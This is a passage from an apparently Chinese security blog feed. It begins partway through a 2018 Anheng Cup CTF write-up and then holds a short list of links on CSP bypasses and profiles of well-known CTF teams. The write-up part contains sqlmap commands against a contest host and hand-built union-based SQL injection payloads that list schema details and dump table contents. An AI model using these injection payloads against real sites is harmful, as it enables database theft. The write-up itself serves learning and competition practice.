class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">D:\www\test&gt;type &quot;index&lt;&quot;</span><br><span class="line">系统找不到指定的文件。</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index&lt;&quot;</span><br><span class="line">系统找不到指定的文件。</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.p&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.php&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.php&lt;&lt;&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br></pre></td></tr></table></figure><p>于是把php改为phP，就可以注入了</p><p>先上sqlmap</p><p>获取数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --dbs -p id --thread 10</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969664379.png" alt="1526969664379"></p><p>拿到当前数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin <span class="comment">--flush -p id --thread 10 --current-db</span></span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969882637.png" alt="1526969882637"></p><p>获得表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb --tables</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970077793.png" alt="1526970077793"></p><p>拿到表里面的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb -T article --dump</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970228303.png" alt="1526970228303"></p><p>尝试手动注入一波</p><p>单引号没反应</p><p>双引号报错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &apos;Exception&apos; with message &apos;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&apos; at line 1 query: select * from article where title =&quot;admin&quot; &quot;&apos; in E:\apache2\htdocs\MysqliDb.php:1926 Stack trace: #0 E:\apache2\htdocs\MysqliDb.php(516): MysqliDb-&gt;_prepareQuery() #1 E:\apache2\htdocs\MysqliDb.php(550): MysqliDb-&gt;rawQuery(&apos;select * from a...&apos;, NULL) #2 E:\apache2\htdocs\json.php(39): MysqliDb-&gt;rawQueryOne(&apos;select * from a...&apos;) #3 &#123;main&#125; thrown in E:\apache2\htdocs\MysqliDb.php on line 1926</span><br></pre></td></tr></table></figure><p>发现这一句，要用双引号闭合</p><blockquote><p>select * from article where title =”admin” “‘ in </p></blockquote><p>order by 判断一下，4的时候错误，那就说明表有三列</p><blockquote><p>id=admin” order by 3%23</p></blockquote><p>把admin随便换一个，这样前面没有数据就会把union select的值输出，这里发现把1和2输出</p><blockquote><p>id=-“ union select 1,2,3%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971766987.png" alt="1526971766987"></p><p>获得数据库 5monthweb</p><blockquote><p>id=-“ union select user(),database(),3%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971888625.png" alt="1526971888625"></p><p>获得表名 article </p><blockquote><p>id=-“ union select user(),table_name,3 from information_schema.tables where table_schema = database()%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972049073.png" alt="1526972049073"></p><p>获得列名 id,title,content </p><blockquote><p>id=-“ union select user(),group_concat(column_name),3 from information_schema.columns where table_schema = database()%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972166936.png" alt="1526972166936"></p><p>得表里面的数据</p><blockquote><p>id=-“ union select user(),concat_ws(char(32,58,32),id,title,content),3 from 5monthweb.article %23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972278977.png" alt="1526972278977"></p><blockquote><p>flag{you_are_admin}</p></blockquote><p>附上安恒杯月赛讲解视频链接</p><blockquote><p>直播地址：<a href="http://study.163.com/course/courseMain.htm?courseId=1004945010&amp;share=2&amp;shareId=400000000254024" target="_blank" rel="noopener">http://study.163.com/course/courseMain.htm?courseId=1004945010&amp;share=2&amp;shareId=400000000254024</a> </p><p>解题讲师：你们最最熟悉的xsser老师 </p></blockquote><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="wifi密码是多少"><a href="#wifi密码是多少" class="headerlink" title="wifi密码是多少"></a>wifi密码是多少</h2><blockquote><p>你猜猜 咱们的wifi密码是多少？ 你懂操作系统吗 哈哈哈哈  </p></blockquote><p>文件：5afea37acccbc.bin</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526805894626.png" alt="1526805894626"></p><blockquote><p>flag{Y0ung_m4n_u_are_s0_coo1!}</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;奇怪的恐龙特性&quot;&gt;&lt;a href=&quot;#奇怪的恐龙特性&quot; class=&quot;headerlink&quot; title=&quot;奇怪的恐龙特性&quot;&gt;&lt;/a&gt;奇怪的恐龙特性&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="Web" scheme="http://blog.Lhaihai.wang/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CSP学习笔记</title>
    <link href="http://blog.Lhaihai.wang/2018/05/20/CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.Lhaihai.wang/2018/05/20/CSP学习笔记/</id>
    <published>2018-05-20T14:41:21.000Z</published>
    <updated>2018-05-20T16:25:46.389Z</updated>
    
    <content type="html"><![CDATA[<p>阮一峰：<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">Content Security Policy 入门教程</a></p><p><a href="https://en.wikipedia.org/wiki/Content_Security_Policy" target="_blank" rel="noopener">Content Security Policy</a></p><p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">通过浏览器缓存来bypass CSP script nonce</a></p><p>梅子酒： <a href="https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw" target="_blank" rel="noopener">使用 Wave 文件绕过 CSP 策略</a></p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;阮一峰：&lt;a href=&quot;http://www.ruanyifeng.com/blog/2016/09/csp.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Content Security Policy 入门教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Content_Security_Policy&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Content Security Policy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://lorexxar.cn/2017/05/16/nonce-bypass-script/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;通过浏览器缓存来bypass CSP script nonce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;梅子酒： &lt;a href=&quot;https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;使用 Wave 文件绕过 CSP 策略&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CSP" scheme="http://blog.Lhaihai.wang/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>国内外杰出的CTF战队（持续更新）</title>
    <link href="http://blog.Lhaihai.wang/2018/05/20/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F/"/>
    <id>http://blog.Lhaihai.wang/2018/05/20/国内外杰出的CTF战队/</id>
    <published>2018-05-20T14:40:46.000Z</published>
    <updated>2018-05-20T16:34:02.237Z</updated>
    
    <content type="html"><![CDATA[<p>因为觉得自己和同学只是会打打CTF，对国际和国内一些Team不是很了解，特地开了这篇博客,本文的资料均来自下方链接，目前主要内容来自 公众号：<a href="javascript:void(0" target="_blank" rel="noopener">腾讯安全联合实验室</a>;) ，<a href="https://www.xctf.org.cn/" target="_blank" rel="noopener">XCTF社区</a></p><a id="more"></a><p><a href="https://mp.weixin.qq.com/s/QdwpnVdz4fV0qJKTgoMO9w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QdwpnVdz4fV0qJKTgoMO9w</a></p><p><a href="https://mp.weixin.qq.com/s/Fp7Ja_nzIHy84yeWRi6l0Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Fp7Ja_nzIHy84yeWRi6l0Q</a></p><p><a href="https://www.leiphone.com/news/201706/9KnCeQQXC1vrHVrt.html" target="_blank" rel="noopener">https://www.leiphone.com/news/201706/9KnCeQQXC1vrHVrt.html</a></p><h3 id="蓝莲花战队"><a href="#蓝莲花战队" class="headerlink" title="蓝莲花战队"></a>蓝莲花战队</h3><p>蓝莲花（Blue-Lotus）战队是一支源自清华大学的网络安全技术竞赛和研究团队，是中国参与CTF（Capture The Flag）网络安全技术竞赛成绩最为突出的一支国际知名战队。</p><p>2013年成为华人世界历史上首支成功闯入DEFCON黑客大会 CTF全球总决赛[1] 的队伍，并获得安全宝冠名赞助。2014年连续第二次入围DEFCON CTF全球总决赛，并获得第五名的优秀战绩。2014年蓝莲花战队成功组织BCTF“百度杯”全国网络安全技术对抗赛，成为当时全国参与规模最大的CTF赛事，并在2014至2015年开始发起并总体组织XCTF全国网络安全技术对抗联赛。 </p><h3 id="AAA战队："><a href="#AAA战队：" class="headerlink" title="AAA战队："></a>AAA战队：</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640.webp" alt="img"></p><p>AAA战队是由浙江大学信息安全爱好者自发组织、浙江大学计算机学院支持建立的团队，在CTF圈颇有名气，曾获2016年ZCTF冠军、TCTF 2017新人邀请赛冠军、WHCTF 2017冠军、以及2017年高校网络信息安全管理运维挑战赛全国总冠军；并于2017年与腾讯、上海交通大学、复旦大学组成腾讯A0E联合战队参加DEF CON CTF 2017全球总决赛，在全球十数支顶级战队中斩获季军。在TCTF 2018的线上预赛阶段，AAA战队在也取得了第一名。</p><p>毫无疑问，他们是本年度TCTF夺冠的热门战队。</p><h3 id="Redbud战队：专注实力提升"><a href="#Redbud战队：专注实力提升" class="headerlink" title="Redbud战队：专注实力提升"></a>Redbud战队：专注实力提升</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833800626.webp" alt="img"></p><p>Redbud战队由来自清华大学学生网络安全技术协会的信息安全爱好者组成。Redbud，意为”紫荆”，战队的宗旨是不为名次和奖励，只为锻炼和提升个人的技术水平，加强和CTF优秀选手的交流与互动，并为国内知名战队——蓝莲花战队（Blue-Lotus）培养后备力量。</p><p>该战队的成绩从去年第四届XCTF联赛线上赛以来一直保持着高位，最近更是迎来了全面的爆发，在本届TCTF 线上预赛以第二名的成绩挺进决赛。</p><h3 id="emmmm战队：看队名看不透实力"><a href="#emmmm战队：看队名看不透实力" class="headerlink" title="emmmm战队：看队名看不透实力"></a>emmmm战队：看队名看不透实力</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833809327.webp" alt="img"></p><p>emmmm战队是由哈尔滨工业大学、北京邮电大学和中国科学技术大学组成的联合战队，战队名字颇为俏皮，但备赛经验丰富，在本届TCTF线上预赛中位列高校战队前三。</p><p>emmmm战队表示，要在TCTF 2018线下决赛取得突破性成绩，努力摘得桂冠。</p><h3 id="Vidar战队：“As-we-do-as-you-know”"><a href="#Vidar战队：“As-we-do-as-you-know”" class="headerlink" title="Vidar战队：“As we do, as you know”"></a>Vidar战队：“As we do, as you know”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833812099.webp" alt="img"></p><p>Vidar战队来自杭州电子科技大学，是浙江高校中最早建立的白帽黑客团队，由杭电信息安全协会（原HDUISA）和网络空间安全学院合并而成。团队前身 HDUISA 是杭州电子科技大学信息安全协会。Vidar战队中聚集了一批又一批对信息技术感兴趣的同学，互相交流学习信息安全领域的知识及技术。同时为了检测自己的水平，以国内外的各种相关比赛为载体与各大高校乃至列强劲旅一较高下，至今已成功举办九届HCTF比赛。</p><p>该战队认为，编程技术可谓一日千里，新漏洞层出不穷，CTF题目的脑洞越开越大，实践能力是关键。As we do, as you know。</p><h3 id="kap0k战队：迅速崛起的新生力量"><a href="#kap0k战队：迅速崛起的新生力量" class="headerlink" title="kap0k战队：迅速崛起的新生力量"></a>kap0k战队：迅速崛起的新生力量</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833816419.webp" alt="img"></p><p>​      kap0k 团队是一支源自华南理工大学的网络安全技术竞赛和研究团队，成立于 2017 年三月。 kap0k 名字源自木棉树，为华南理工大学校树，寓意着团队成员对技术的不懈追求和对黑客自由精神的坚守。建队以来，秉持着以技术让网络更安全的理念，kap0k 的成员在校园网安全建设、CTF 竞赛、安全大数据竞赛等安全的诸多方面都有所建树。kap0k 是实力正在迅速增强的新生CTF战队， 曾在第四届XCTF联赛揭幕战武汉站WHCTF线上赛取得第八名的好成绩。</p><h3 id="MxM战队：-网络安全与执法并重"><a href="#MxM战队：-网络安全与执法并重" class="headerlink" title="MxM战队： 网络安全与执法并重"></a>MxM战队： 网络安全与执法并重</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833820127.webp" alt="img"></p><p>​     MxM来自浙江警察学院，是警校的优良作风建设下迅速崛起的新生力量，实力演绎警校学生对信息安全领域的不停追求与探索。该战队表示，通过参加专业CTF赛事，加强自身网络安全法制实践能力，是提高网络警察专业的人员执法能力和效率的保障。</p><h3 id="Lancet战队：做网络世界的手术刀"><a href="#Lancet战队：做网络世界的手术刀" class="headerlink" title="Lancet战队：做网络世界的手术刀"></a>Lancet战队：做网络世界的手术刀</h3><p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><p>Lancet源自于北京航空航天大学的网络安全技术竞赛和研究团队，战队成立于2015年10月，获得过2016年信息安全与对抗技术竞赛分组对抗赛全国一等奖、“安恒杯”全国高校网络安全技能竞赛第一名、“美亚柏科”大学生网络空间安全精英邀请赛第一名等多个奖项。2017 年在GMIC-XCTF京津冀邀请赛稳居冠军宝座；第四届XCTF联赛揭幕战武汉站WHCTF线上赛排名第三，网络安全经验丰富，实力不凡。</p><p>Lancet战队表示，要做网络世界的手术刀，既要撕裂网络世界的表面看到安全隐患，也要为网络安全主刀消除隐患。</p><h3 id="kn0ck战队：“To-be-or-not-to-be”"><a href="#kn0ck战队：“To-be-or-not-to-be”" class="headerlink" title="kn0ck战队：“To be or not to be”"></a><em>kn0ck</em>战队：“To be or not to be”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833822811.webp" alt="img"></p><p><em>kn0ck</em>战队于2018上半年成立，是多个高校组合联盟战队，由国内信息安全专业实力雄厚的高校学生组成。战队成员因兴趣与热爱而聚集，以不服输的精神全力向着梦想进发。</p><p>作为一支新兴的CTF队伍，战队的宗旨是通过实际比赛将理论知识更好的发挥，以赛代练，锻炼和提升个人的技术水平，在比赛中广交朋友，共同进步。今年，该战队在赛博地球杯工业互联网安全大赛线上初赛榜单上位居前十。</p><h3 id="Ph0t1n1a战队：以赛代练，提高实战能力"><a href="#Ph0t1n1a战队：以赛代练，提高实战能力" class="headerlink" title="Ph0t1n1a战队：以赛代练，提高实战能力"></a>Ph0t1n1a战队：以赛代练，提高实战能力</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833825552.webp" alt="img"></p><p>Ph0t1n1a是来自上海交通大学一支新兴的极客力量。其队名源于上海交通大学校花——石楠花（photinia）英文单词的变形。</p><p>Ph0t1n1a战队的宗旨是：以赛代练，在比赛中提高自己的实战能力。</p><h3 id="CNSS战队：“Stay-hacking-stay-exploring”"><a href="#CNSS战队：“Stay-hacking-stay-exploring”" class="headerlink" title="CNSS战队：“Stay hacking, stay exploring”"></a>CNSS战队：“Stay hacking, stay exploring”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833827489.webp" alt="img"></p><p>CNSS战队，来自由电子科技大学信息安全爱好者自发组织的一个研究网络安全的技术团队——凝聚工作室，是电子科大古老工作室文化的代表；开放、包容，有着对技术的独特理解。该战队曾在世界顶级黑客大会Hack in the box(HITB)的CTF线上赛中，取得全球第17名的好成绩。</p><p>CNSS战队认为，凝聚工作室存在的价值和意义是一种校园创新文化的营造，一届又一届地传递一种挑战的精神和文化。</p><h3 id="Blue-Whale战队：培养信息安全兴趣是初衷"><a href="#Blue-Whale战队：培养信息安全兴趣是初衷" class="headerlink" title="Blue-Whale战队：培养信息安全兴趣是初衷"></a>Blue-Whale战队：培养信息安全兴趣是初衷</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833830085.webp" alt="img"></p><p>Blue-Whale来自中国海洋大学，2012年依托于中国海洋大学信息安全实验室而成立。团队以中国海洋大学信息安全实验室为基础，专注于信息安全领域研究，研究方向包括系统安全、渗透测试、密码学等。自成立之初，Blue-Whale团队始终以培养信息安全兴趣，研究与分享信息安全知识与技术为目标。历经两年发展后，Blue-Whale战队开始活跃于国内外各类CTF比赛中。在2013-2014年山东省大学生信息安全知识竞赛中包揽团队和个人冠军，在2016年全国大学生信息安全大赛中获得二等奖。</p><h3 id="WaterDrop：“方寸之间，深不见底”"><a href="#WaterDrop：“方寸之间，深不见底”" class="headerlink" title="WaterDrop：“方寸之间，深不见底”"></a>WaterDrop：“方寸之间，深不见底”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833832679.webp" alt="img"></p><p>WaterDrop，来自中山大学的一支新兴战队，第一代组建于2017年初。战队名WaterDrop取自科幻小说《三体》中提到的由强相互作用力材料（SIM）所制成的宇宙探测器，寄寓着我们的目标。因为其形状与水滴相似所以被人类称之为水滴，会反射几乎100%的电磁波，完全由被强相互作用力紧密锁死的质子与中子构成，无坚不摧，“方寸之间，深不见底”。</p><h3 id="NeSE战队：Never-Stop-Exploiting"><a href="#NeSE战队：Never-Stop-Exploiting" class="headerlink" title="NeSE战队：Never Stop Exploiting"></a>NeSE战队：Never Stop Exploiting</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833834657.webp" alt="img"></p><p>NeSE成立于2015年，主要成员都来自中国科学院信息工程研究所，战队全称为“Never Stop Exploiting”， 象征着永不停止钻研的极客精神。NeSE战队一直以来都希望通过参加高层次的CTF竞赛，提高实践能力，累积互联网攻防经验。战队成绩也十分突出，曾获得TCTF 2017预赛第六、决赛第十，AliCTF 2016国内第一，第十届全国大学生信息安全竞赛线上赛第一名等成绩。</p><p>在本届TCTF预赛阶段，NeSE战队以十二名的成绩出线，成为决赛夺冠竞争者。</p><h3 id="Dragon-Sector战队：波兰劲旅"><a href="#Dragon-Sector战队：波兰劲旅" class="headerlink" title="Dragon Sector战队：波兰劲旅"></a>Dragon Sector战队：波兰劲旅</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833836523.webp" alt="img"></p><p>Dragon Sector战队是一支来自波兰的战队，隶属于Google安全团队，成立于2013年2月。Dragon Sector战队目前有16名活跃队员，经常参加线上线下安全竞赛。这支队伍非常擅长“逆向”领域的试题，整体解题思路非常特殊，经常出人意料。尤其在比赛中后劲十足，往往成为CTF比赛的焦点，他们在比赛中的解题思路也经常被波兰当地杂志刊登。</p><p>在CTFTIME梳理的近五年全球CTF战队评级中，Dragon Sector都位列前十，2018年的实力评级为第五，是一支名副其实的劲旅。</p><h3 id="lotus-r3kapig战队-“给我一朵蓝莲花，我能撬起一飞猪”"><a href="#lotus-r3kapig战队-“给我一朵蓝莲花，我能撬起一飞猪”" class="headerlink" title="lotus-r3kapig战队: “给我一朵蓝莲花，我能撬起一飞猪”"></a>lotus-r3kapig战队: “给我一朵蓝莲花，我能撬起一飞猪”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833838758.webp" alt="img"></p><p>lotus-r3kapig战队是由国内蓝莲花、Eur3kA和flappypig三支战队组建的联合战队，自称是“究极完全体阿基米德莲花猪”，在TCTF 2018国际赛预赛中位列第三。该战队的口号是：“给我一朵蓝莲花，我能撬起一飞猪”。</p><h3 id="Cykor战队：冠军专业户"><a href="#Cykor战队：冠军专业户" class="headerlink" title="Cykor战队：冠军专业户"></a>Cykor战队：冠军专业户</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833841469.webp" alt="img"></p><p>Cykor战队由韩国大学生信息安全研究俱乐部组成，成立于2011年。他们在第二届XCTF国际联赛总决赛中荣获冠军；在TrendMicro CTF、Codegate 2017 prequals以及SECCON 2016 Final competition等诸多大赛中都曾摘得桂冠。最令人印象深刻的是，CyKor成员参与的DEFKOR战队在2015年DEF CON世界顶级黑客大赛中上演绝地反击、力压PPP战队的精彩一战使他们成为首个赢得DEF CON CTF冠军的韩国黑客团队，也正是因为这场比赛让他们一战成名。</p><p>而这对于Cykor战队来说并不是终点，战队成员一致认为，参加这么多CTF比赛，就是为了追赶世界顶级极客的步伐。</p><p>曾因韩国神童Lokihardt的加入，获得趋势亚太CTF、HITCON CTF 2015和HDCON CTF 2015的冠军，在Belluminar 2016夺得亚军，在Codegate 2017 prequals 和SECCON 2016 决赛中获得冠军。</p><h3 id="PwnThyBytes战队：主要是回馈社会"><a href="#PwnThyBytes战队：主要是回馈社会" class="headerlink" title="PwnThyBytes战队：主要是回馈社会"></a>PwnThyBytes战队：主要是回馈社会</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833844562.webp" alt="img"></p><p>PwnThyBytes战队是来自罗马尼亚的队伍，成立于2015年，有着非常丰富的大赛经验，曾参加过Codegate CTF 2014、2017，TCTF 2017，HITCON CTF 2016，SECCON 2015，Trend 